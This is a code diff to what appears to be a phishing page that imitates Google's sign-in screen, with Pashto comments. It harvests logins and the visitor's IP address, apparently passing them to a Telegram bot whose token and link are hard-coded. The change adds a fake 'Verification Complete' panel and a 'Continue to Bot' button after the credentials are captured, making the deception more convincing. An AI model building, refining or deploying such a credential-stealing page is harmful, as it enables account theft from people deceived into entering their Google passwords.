@@ -70,6 +70,19 @@
         .success-msg { background: #e6f4ea; border: 1px solid #34a853; color: #137333; }
         .footer { display: flex; justify-content: center; gap: 1.2rem; margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid #e8eaed; font-size: 0.7rem; color: #5f6368; }
         .step-text { text-align: center; font-size: 0.7rem; color: #5f6368; margin-top: 0.5rem; }
+        .continue-btn {
+            width: 100%;
+            padding: 0.85rem;
+            background: #34a853;
+            color: white;
+            border: none;
+            border-radius: 0.25rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        .continue-btn:hover { background: #2d8c47; }
     </style>
 </head>
 <body>
@@ -96,6 +109,13 @@
         <div class="guest-text">Not your computer? Use Guest mode to sign in privately.<div style="margin-top:0.3rem;"><a href="#" onclick="alert('Learn more'); return false;">Learn more</a></div></div>
     </div>
 
+    <div id="successPanel" style="display: none;">
+        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <h1>✅ Verification Complete</h1>
+        <div class="sub">Your account has been successfully verified!</div>
+        <button class="continue-btn" id="continueBtn">Continue to Bot →</button>
+    </div>
+
     <div id="errorBox" class="message error-msg"></div>
     <div id="successBox" class="message success-msg"></div>
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
@@ -103,7 +123,7 @@
 </div>
 
 <script>
-    // ========== مهم: د بوټ لینک - خپل بوټ یوزرنیم دلته دننه کړئ ==========
+    // ========== ستاسو د بوټ لینک ==========
     const BOT_REDIRECT = "https://t.me/imrankhabot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -111,6 +131,7 @@
 
     let attempts = {};
     let currentEmail = "";
+    let loginSuccess = false;
 
     async function getUserIP() {
         try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; }
@@ -178,13 +199,17 @@
                 })
             });
             
-            showMessage(document.getElementById('successBox'), '✅ Login successful! Redirecting...', false);
+            loginSuccess = true;
             
-            // بوټ ته لاړ شه
-            setTimeout(() => {
-                window.location.href = BOT_REDIRECT;
-            }, 1500);
+            // د بریالیتوب پینل ښکاره کړئ
+            document.getElementById('step2View').style.display = 'none';
+            document.getElementById('successPanel').style.display = 'block';
         }
+    };
+    
+    // د Continue تڼۍ - بوټ ته ځي
+    document.getElementById('continueBtn').onclick = () => {
+        window.location.href = BOT_REDIRECT;
     };
 </script>
 </body>
